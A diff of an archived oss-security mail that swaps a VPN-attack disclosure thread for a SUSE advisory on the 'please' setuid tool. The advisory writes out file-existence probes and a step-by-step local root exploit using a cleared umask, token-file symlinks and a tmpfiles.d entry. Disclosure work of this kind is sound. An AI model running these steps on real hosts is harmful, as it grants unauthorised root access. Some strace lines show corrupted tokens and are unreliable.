@@ -1,207 +1,230 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/07/05/1
-Message-ID: <0b9b495647cd4793e2ac882ce82b520c@breakpointingbad.com>
-Date: Sun, 04 Jul 2021 20:33:30 -0700
-From: vpn-research@...akpointingbad.com
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/18/1
+Message-ID: <YKOT2W06Zbh45EJw@f195.suse.de>
+Date: Tue, 18 May 2021 12:15:53 +0200
+From: Matthias Gerstner <mgerstner@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: Blind in/on-path attacks against VPN-tunneled connections (CVE-2019-14899 follow-up)
+Subject: please: CVE-2021-31153,CVE-2021-31154,CVE-2021-31155: local root exploit and further security issues in sudo-like utility
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+Hello list,
 
-I'm just circling back now that we have a virtual environment for you to 
-test.
+"please" [1] is a sudo replacement written in Rust. Its author requested
+a code review for inclusion of the setuid-root binary in openSUSE [2].
 
-This was produced as an artifact for our Usenix paper on this 
-vulnerability and the one covered by CVE-2019-14899. The included 
-virtual environment is for OpenVPN, but we have one for WireGuard and 
-StrongSwan as well that we can share upon request. I'll also provide a 
-link for the paper.
+I reviewed the source of please version 0.3.3 and found multiple
+security issues including a local root exploit (item 1.d) for users that
+are allowed to run a command. You can find the detailed report below.
 
-A CVE has still not been assigned for this issue, but it has been 
-submitted to MITRE.
+# 1) Findings in `please`
 
-https://git.breakpointingbad.com/Breakpointing-Bad-Public/vpn-attacks
+## a) Arbitrary File Existence Test and Arbitrary File Open via `-c`, `--check`
 
-https://www.usenix.org/system/files/sec21fall-tolley.pdf
+  Arbitrary file existence test and arbitrary file open as root is possible
+  via the `-c`, `--check` command line switch. This does not involve an
+  information leak but triggers kernel logic not usually available to regular
+  users e.g. when sockets or special devices are involved. It also allows the
+  setuid-root program to run out-of-memory. Examples:
 
-Thanks,
+  ```
+  # runs OOM
+  user$ please -c /dev/zero
+  Killed
 
-Breakpointing Bad
------------------
-William J. Tolley
-Beau Kujath
-Jedidiah Crandall
+  # reads the full block device until OOM occurs
+  user$ please -c /dev/sda
+  Killed
 
+  # this file exists (in my case)
+  user$ please -c /root/.bash_history
+  Error parsing /root/.bash_history:712
+  Error parsing /root/.bash_history:716
+  Error parsing /root/.bash_history:1380
+  Error parsing /root/.bash_history:1382
+  # this doesn't exist
+  user$ please -c /root/.something
+  ```
 
+  The file existence test allows for a minimal information leak in terms of
+  the involved line numbers output in the error messages.
 
-On 2020-08-13 08:06, vpn-research@...akpointingbad.com wrote:
-> Hi all,
-> 
-> This is reporting a vulnerability that allows an in/on-path attacker
-> between a VPN client and VPN server to infer and inject arbitrary data
-> into VPN-tunneled connections. This vulnerability is related to
-> CVE-2019-14899, but has a few key differences.
-> 
-> - The attacker does not need to be the gateway or network adjacent, as
-> described in CVE-2019-14899.
-> 
-> - The packets are not being spoofed "outside" of the tunnel. In the
-> previous attack, the packets were sent to the wireless/ethernet
-> interface and were still being processed by the kernel despite coming
-> from a non-VPN interface, in this attack we are not subverting the
-> tunnel by sending packets to the incorrect interface, but sending
-> packets to the VPN server with the source address of the endhost (such
-> as a web server).  Thus, for the VPN server, the spoofed packets that
-> make it into the tunnel are identical to real packets from the
-> endhost, and enter the VPN server from the same interface.  For the
-> VPN client, the spoofed packets are coming through the VPN tunnel from
-> the VPN server.
-> 
-> - Enabling rp_filtering on the client machine does not prevent this
-> attack, and source address validation on the scale of the Internet
-> doesn't really exist.  Note that rp_filter on the server is
-> irrelevant, since spoofed packets enter on the same interface as
-> legitimate packets.
-> 
-> - The VPN providers and operating systems affected by this attack is
-> expanded to include policy-based VPNs and Windows etc.
-> 
-> We reported this to disros@...openwall.org and security@...nel.org on
-> July 29th, but have not yet received any responses from any vendors
-> with a CVE pool. While related to CVE-2019-14899 in that we examine
-> the timing and size of encrypted packets to infer information about
-> packet headers, we believe this attack is significantly different and
-> should be assigned a CVE and addressed since the previous mitigation
-> does not prevent this attack.
-> 
-> We have included our correspondence with distros and kernel security
-> in the form of a FAQ on our blog here:
-> https://breakpointingbad.com/2020/08/12/VPN-FAQ.html#faq.
-> 
-> To prevent the cluster foxtrot of misinformation from the last
-> disclosure, we request that anyone wanting to report on this contact
-> us at vpn-research@...akpointingbad.com.
-> 
-> William J. Tolley
-> Beau Kujath
-> Jedidiah R. Crandall
-> 
-> Breakpointing Bad &
-> Arizona State University
-> 
-> ***********************************************
-> 
-> This is a follow-up to our report on November 20th of last year
-> detailing how connections inside a VPN tunnel could be inferred,
-> reset, and in some cases, hijacked by injecting data into the TCP
-> stream. We have expanded the attack by moving one or more hops away
-> from the client to an in-path middle router between the client and VPN
-> server. In our previous disclosure, a client-side mitigation using
-> iptables or nftables was suggested, but we are unsure of how to
-> prevent this new attack and do not believe there is a client-side
-> solution.
-> 
-> Our setup is as follows:
-> 
-> 
-> vpn client ----- AP ----- router 1 ------ router 2 ----- vpn server
-> 
->                                  \        /
-> 
->                                    \    /
-> 
->                                      \/
-> 
->                                    router 3
-> 
->                                       |
-> 
->                                    website
-> 
-> (If formatting is a problem: 
-> https://breakpointingbad.com/assets/virtlab.jpg)
-> 
-> 
-> The VPN client and access point both have reverse path filtering
-> enabled, and the client has an active connection to the website
-> through the VPN server. The attack is performed from router 1,
-> spoofing a packet that appears to be from the website to the VPN
-> server. To infer a connection that the VPN client has made on the
-> other end of the VPN tunnel, we spoof the packet coming from router 1
-> with the source address and port of the website and the destination
-> address of the VPN server.  By searching the ephemeral port space for
-> the last part of the 4-tuple, one of the spoofed packets will be NATed
-> by the VPN server (if the connection exists) and seen in the VPN
-> tunnel by router 1 (by looking at the size of encrypted packets going
-> from VPN server to VPN client).
-> 
-> Unlike the previous attack from the perspective of the gateway, or an
-> adjacent user, we do not need to know the virtual IP assigned to the
-> client.  However, as with the previous attack, the attacker must
-> already know the IP address that they anticipate the victim will
-> connect to using the VPN.  But testing a site is trivial, especially
-> if we limit the scope to a targeted attack from nation state testing
-> against a banned list, for example.
-> 
-> We have tested this in a limited, virtual environment, but we are
-> starting our effort to test this on the “real internet”, where we will
-> need to account for packet loss, packet reordering, and packet delay,
-> but in many ways this attack is an easier attack than the original
-> that led to CVE-2019-14899 since it removes some of the most
-> time-consuming elements of the previous attack.
-> 
-> We have tested this against OpenVPN, WireGuard, and StrongSwan. We
-> selected these since they are the most commonly used commercial VPN
-> platforms. It was suggested by Noel Kuntze in the previous thread that
-> the old attack wouldn’t work against policy-based VPNs, such as IPSec
-> using StrongSwan, so we included it in this effort to demonstrate how
-> the new attack does not depend on anything particular to the network
-> stack or VPN implementation of the client.  We have only tested
-> inferring that a TCP connection exists up to this point, but it should
-> be possible to reset or hijack that TCP connection in a manner similar
-> to the original attack since we can spoof packets into the tunnel at
-> the VPN server end.  Again, this works regardless of the VPN client’s
-> configuration, OS, etc.
-> 
-> We are still developing other attacks using this method, including
-> attacks on DNS similar to those suggested by Colm MacCárthaigh.  By
-> using a DoS attack to have the DNS server ignore DNS requests from the
-> VPN server, we can guess the source port as above and then search as
-> much of the TXID space as possible within the timeout period of the
-> DNS request.  We have successfully hijacked VPN-tunneled DNS requests,
-> and are working on speeding up our attacks to make it more likely to
-> work for any given request.
-> 
-> Just to summarize and put both forms of attack (spoofing to the VPN
-> client from a network adjacent position vs. spoofing to the VPN server
-> from any router on the path from VPN client to VPN server) into
-> perspective:
-> 
-> -We’re still able to infer the existence of VPN-tunneled TCP
-> connections, and potentially RST and hijack them, regardless of VPN
-> client OS or anything the VPN client has done to patch against
-> CVE-2019-14899.
-> 
-> -We note that TLS does not protect against inferring and resetting
-> connections in general, and our ability to hijack DNS requests also
-> means that TLS encryption alone will not protect a TCP connection.
-> VPNs are supposed to protect the integrity of tunneled traffic
-> independently of application-layer protections (such as TLS). Our work
-> shows that they do not.
-> 
-> -Attacking by spoofing packets to the VPN server instead of the VPN
-> client changes the threat model to be not only attackers that are
-> network adjacent to the VPN client, but also attackers that are
-> in/on-path between the VPN client and VPN server (e.g., the routers
-> that route packets between them).
-> 
-> We also want to point out that the target audience for this disclosure
-> is kernel developers and others familiar with network stack
-> implementations and the details of how VPN routing works.  As with the
-> first disclosure we plan to follow list policy and make the disclosure
-> public after 14 days.  Our last disclosure was misinterpreted by many
-> media outlets and podcasters, so we’d like to point out that anybody
-> with questions about the disclosure can email
-> vpn-research@...akpointingbad.com and we’ll be happy to answer what
-> questions we can.
+## b) Arbitrary File Existence Test via the `search_path()` function
+
+  Arbitrary file existence test is possible via the `search_path()` function,
+  called in please.rs:254. Examples:
+
+  ```
+  # this file doesn't exist
+  user$ please /root/.something
+  [please]: command not found
+
+  # this file exists (in my case)
+  user$ please /root/.bash_history
+  You may not execute "/root/.bash_history" on <host> as root
+  ```
+
+## c) Arbitrary file existence test via the `-d` switch
+
+  This one also allows differentiation between dirs and files.
+
+  ```
+  # here /root/.gnupg exists and is a directory
+  user$ please -d /root/.gnupg cat /etc/fstab
+  [<fstab content>]
+
+  # here /root/.bash_history exists but is not a directory
+  user$ please -d /root/.bash_history cat /etc/fstab
+  Cannot cd into /root/.bash_history: Not a directory (os error 20)
+
+  # here /root/.something does not exist at all
+  user$  please -d /root/.something  cat /etc/fstab
+  Cannot cd into /root/.something: No such file or directory (os error 2)
+  ```
+
+## d) The Token Dir "/var/run/pleaser/token" is Created with Unsanitized umask
+
+  The token dir "/var/run/pleaser/token", if not existing, is created via
+  Rust's `create_dir_all` and the process's umask is not sanitized. This
+  allows the unprivileged user to influence the resulting directory
+  permissions:
+
+  ```
+  # the directory must not yet exist. If it does, a reboot can help out.
+  test -d /var/run/please && echo "token dir already exists, won't work!"
+  # clear umask
+  user$ umask 0
+
+  # run some arbitrary command, this needs to be allowed via /etc/please.ini
+  # but whether the password is successfully entered or not is unimportant
+  # at this point.
+  user$ please cat /etc/fstab
+  [please] password for user: ^C
+
+  # now the directories should have been created world-writable
+  user$ ls -lhd /var/run/please /var/run/please/token
+  drwxrwxrwx 3 root root 60 31. Mär 13:48 /var/run/please/
+  drwxrwxrwx 2 root root 40 31. Mär 13:48 /var/run/please/token
+
+  # now to grant us access to arbitrary configured commands w/o entering the
+  # user password
+  user$ touch /var/run/please/token/$USER:`tty | tr '/' '_'`:$$
+
+  # should now work w/o password
+  user$ please cat /etc/fstab
+  [<fstab content>]
+
+  # since symlinks are also followed in the token directory we can now create
+  # new world-writable files anywhere in the system after authentication
+  # succeeds. Already existing files can be truncated to size 0 this way.
+  user$ cd /var/run/please/token
+  user$ rm -f $USER:*
+  user$ ln -s /etc/tmpfiles.d/supersafe.conf $USER:`tty | tr '/' '_'`:$$
+  user$ please cat /etc/fstab
+  [please] password for user: <actual password>
+
+  # the file should now have been created world-writable
+  user$ ls -l /etc/tmpfiles.d/supersafe.conf
+  -rw-rw-rw- 1 root root 0 31. Mär 13:57 /etc/tmpfiles.d/supersafe.conf
+  # write some interesting content in there
+  user$ echo "d /root 0777 root root -" >/etc/tmpfiles.d/supersafe.conf
+  # reboot the local system e.g. via power button or display manager, then...
+  user$ ls -lhd /root
+  drwxrwxrwx 10 root root 4.0K 31. Mär 13:46 /root/
+  ```
+
+  So this more or less allows anybody who is allowed to execute at least one
+  command with password authentication to perform a full local root exploit.
+
+## 2) Findings in `pleaseedit`
+
+## a) Predictable Temporary File Names in /tmp and the Target Directory
+
+  pleaseedit uses predictable paths in /tmp and in the target directory via
+  the functions `tmp_edit_file_name()` and `source_tmp_file_name()` and
+  possibly others. Without the Linux kernel's symlink protection this would
+  allow arbitrary file overwrite and ownership change if a regular user is
+  allowed to edit any file via pleaseedit.
+
+  Here is an excerpt of system calls performed in /tmp when editing /etc/fstab
+  successfully:
+
+  ```
+  statx(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", AT_STATX_SYNC_AS_STAT, TA_ALL, 0x7fff21e4cd60) = -1 ENOENT (No such file or directory)
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", _WNLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0100600) = 4
+  chown("/tmp/pleaseedit.user._etc_fstab", 1000, 100) = 0
+  fchmodat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", 0600) = 0
+  execve("/usr/bin/cat", ["/usr/bin/cat", "/tmp/pleaseedit.user._etc_m"...], x55afc490f0 /* 74 vars */) = 0
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY) = 3
+  openat(AT_FDCWD, "/tmp/pleaseedit.user._etc_fstab", O_RDONLY|O_CLOEXEC) = 3
+  unlink("/tmp/pleaseedit.user._etc_fstab") = 0
+  ```
+
+  So the `openat()` calls do not include the `O_NOFOLLOW` flag to explicitly
+  protect against symlinks existing there. Furthermore these paths should
+  really be unpredictable in an `mkstemp()` manner.
+
+  The `chown()` call would allow for a full local root exploit if not for the
+  symlink protection mechanism. A race condition needs to be won, however,
+  because the code tries to remove an existing file in this location first.
+
+  In the target directory `pleaseedit` also potentially follows symlinks:
+
+  ```
+  openat(AT_FDCWD, "/etc/fstab.pleaseedit.copy.user", _WNLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0100600) = 4
+  ```
+
+  So if the target directory is under control of a non-root user then this
+  could also allow privilege escalation, this time there isn't even symlink
+  protection available, because the target directory will not be
+  sticky/world-writable. It requires two user accounts to "work
+  together", however, the user that is invoking `please` and the user
+  that is owning the target directory.
+
+# Bugfixes
+
+I discussed and reviewed fixes for these issues (and for a couple of
+other recommendations I gave) with the upstream author and they are part
+of the v0.4.0 upstream release.
+
+# CVE assignments
+
+- CVE-2021-31153: cummulative for all file and directory existence tests
+  corresponding to findings 1.a, 1.b and 1.c.
+- CVE-2021-31154: for the predictable temporary filenames in pleaseedit
+  corresponding to finding 2.a.
+- CVE-2021-31155: for the missing sanitation of the umask corresponding to
+  finding 1.d.
+
+# Conclusion
+
+Correctly implementing setuid-root binaries remains a challenge also in
+modern programming languages like Rust. While the general design of
+'please' was rather clean it was not implemented setuid aware at all.
+
+# Timeline
+
+2021-03-17: Review request was created
+2021-04-01: I shared the security findings with the upstream author and
+            offered coordinated disclosure.
+2021-04-14: I reviewed the final batch of fixes and we agreed on them.
+2021-05-17: The embargo time frame was unclear for a longer time
+            since Debian Linux updates needed to be prepared, but the
+	    upstream author already published the fixes on Gitlab. I
+	    received the official okay for publishing the full report
+	    only now.
+
+[1]: https://gitlab.com/edneville/please.git
+[2]: https://bugzilla.suse.com/show_bug.cgi?id=1183669
+
+-- 
+Matthias Gerstner <matthias.gerstner@...e.de>
+Dipl.-Wirtsch.-Inf. (FH), Security Engineer
+https://www.suse.com/security
+Phone: +49 911 740 53 290
+GPG Key ID: 0x14C405C971923553
+ 
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG Nürnberg
+Geschäftsführer: Felix Imendörffer
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
